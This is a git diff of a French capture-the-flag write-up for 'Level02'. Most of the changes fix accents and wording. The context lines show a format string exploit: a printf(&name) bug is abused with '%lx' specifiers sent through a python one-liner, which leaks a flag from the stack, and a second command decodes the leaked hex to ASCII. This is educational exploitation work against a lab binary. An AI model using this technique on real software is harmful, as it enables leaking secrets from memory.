@@ -1,6 +1,6 @@
 # Level02
 
-On observe que l'executable prend une entre sur l'entre standard
+On observe que l'exécutable lit un input sur l'entrée standard
 
 ```shell
 $ ./level02
@@ -14,8 +14,8 @@ $ ./level02
 Hello does not have access!
 ```
 
-On remarque un `printf(&name)` de notre username et que le `flag` est lu et stocke
-juste avant notre variable `name` sur la stack. On cherche alors a l'afficher grace
+On remarque un `printf(&name)` de notre username et que le `flag` est lu et stocké
+juste avant notre variable `name` sur la stack. On cherche alors à l'afficher grâce
 au `%x` de printf.
 
 On remarque aussi que l'executable est en `64 bits` grace au nom des registres:
@@ -31,7 +31,7 @@ $ python -c 'print("AAAABBBB %21$lx %22$lx %23$lx %24$lx %25$lx %26$lx %27$lx %2
 AAAABBBB 0 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 0 4242424241414141 does not have access!
 ```
 
-On connait notre flag stocke maintenant. Plus qu'a le convertir en hexa
+On connait notre flag stocké maintenant. Plus qu'à le convertir en ASCII.
 
 ```shell
 $ python -c 'print("\x75\x6e\x50\x52\x34\x37\x68\x48"[::-1] + "\x45\x41\x4a\x35\x61\x73\x39\x51"[::-1] + "\x37\x7a\x71\x43\x57\x4e\x67\x58"[::-1] + "\x35\x4a\x35\x68\x6e\x47\x58\x73"[::-1] + "\x48\x33\x67\x50\x66\x4b\x39\x4d"[::-1])'
